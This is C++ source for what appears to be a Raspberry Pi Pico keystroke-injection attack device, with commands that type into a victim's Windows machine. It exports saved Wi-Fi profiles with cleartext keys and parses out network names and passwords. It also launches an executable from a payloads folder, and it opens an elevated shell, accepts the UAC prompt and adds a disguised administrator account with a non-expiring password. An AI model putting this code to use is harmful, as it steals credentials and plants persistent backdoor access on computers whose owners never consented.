// custom commands (these are more advanced than ducky scripts as they can access the picos hardware (e.g. wifi and files))
void command_get_wifi() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  Keyboard.println("cmd");
  delay(500); 
  CD_TO_DRIVE;
  delay(150);
  Keyboard.println("cd info/wifi");
  Keyboard.println("netsh wlan export profile key=clear");
  Keyboard.println("exit");
  delay(1000);

  File32 folder = fatfs.open("info/wifi");
  if (!folder) {
    println("Error opening wifi folder");
    return;
  }
  println("Reading from wifi folder:");
  while (true) {
    File32 file = folder.openNextFile();
    if (!file) {
      break;
    }
    char contents[file.available()+1] = { '\0' };
    file.read(contents, file.available());
    file.close();
    
    String string_contents = String(contents);
    int name_start = string_contents.indexOf("<name");
    int key_start = string_contents.indexOf("<keyMaterial>");

    if (name_start != -1) {
      String name = string_contents.substring(name_start + 6, string_contents.indexOf("</name>"));
      println("");
      println(name.c_str());
      if( key_start != -1) {
        String password = string_contents.substring(key_start + 13, string_contents.indexOf("</keyMaterial>"));
        println(password.c_str());
      }
      else {
        println("NOT FOUND");
      }
    }
    else {
      println("NOT FOUND");
    }
    }
}
void command_connect_wifi() {
  wifi_status = WIFI_CONNECTING;
  draw_navbar();
  WiFi.begin(YOUR_SSID, YOUR_PASS);

  int timeout = 10;
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(500);
    print(".");
    ip_address = WiFi.localIP().toString().c_str(); 
    //turn ip addres into const char
    const char *ip_address_char = ip_address.c_str();
    println(ip_address_char);
  }
  if (WiFi.status() != WL_CONNECTED && timeout == 0)
  {
    println("WiFi Failed");
  }
  println("Connected to WiFi");
  wifi_status = WIFI_CONNECTED;
  ip_address = WiFi.localIP().toString().c_str();

  draw_navbar();
}
void command_give_exe() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  Keyboard.println("cmd");
  delay(500); 
  CD_TO_DRIVE;
  delay(100);
  Keyboard.println("cd payloads");

  String remote = "example.exe ";
  String argument = "example";
  remote += argument;
  Keyboard.println(remote);
}

// this is an example of what a ducky script '.dd' would be interpreted into 
void command_new_admin() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  Keyboard.print("cmd");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("net user WinSystem John123 /add /fullname:@Windows System@ /passwordchg:no && net localgroup administrators WinSystem /add");
  delay(100);
  Keyboard.println("wmic useraccount where name='WinSystem' set PasswordExpires=false");
  delay(100);
  Keyboard.println("exit");
}

// don't forget to add your custom commands here! 
// make sure your function names don't end in '.dd' otherwise it will try and find a ducky script with that name

std::unordered_map<std::string, std::function<void()>> commands ({
  {"get wifi", command_get_wifi},
  {"connect wifi", command_connect_wifi},
  {"give exe", command_give_exe},
  {"new admin", command_new_admin}
});